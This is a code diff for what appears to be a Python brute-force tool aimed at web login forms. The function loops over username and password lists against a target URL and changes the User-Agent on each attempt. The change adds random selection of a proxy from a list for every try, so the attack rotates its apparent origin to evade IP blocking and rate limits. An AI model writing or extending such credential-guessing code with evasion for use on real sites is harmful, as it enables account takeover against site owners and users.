@@ -37,7 +37,7 @@ def actionGatherFormInfo(optionURL):
 
 
 
-def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyConnect = False):
+def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList):
 	############################################
 	#	Old code logic:
 	#		Create 1 browser object per password
@@ -47,10 +47,8 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyConn
 	#
 	############################################
 
-
 	#	Get login form field informations
 	frmLoginID, frmUserfield, frmPassfield = actionGatherFormInfo(optionURL)
-
 	#	Get single Username in username list / file
 	for tryUsername in optionUserlist:
 		#	If tryUsername is file object, remove \n
@@ -75,11 +73,13 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyConn
 			#	New test code block: add new user_agent each try
 			user_agent = actions.getUserAgent()
 			proc.addheaders = [('User-Agent', user_agent)]
-			# if setProxyConnect == True:
-			# 	#Set proxy connect
-			# 	proxyAddr = actions.getProxyAddr()
-			# 	#utils.printf("Debug: proxy addr %s" %(proxyAddr))
-			# 	proc.set_proxies({"http": proxyAddr})
+			
+			
+			if setProxyList:
+				#Set proxy connect
+				proxyAddr = actions.randomSelectFromList(setProxyList)
+				#utils.printf("Debug: proxy addr %s" %(proxyAddr))
+				proc.set_proxies({"http": proxyAddr})
 
 			proc.open(optionURL)
 			#	End new code block
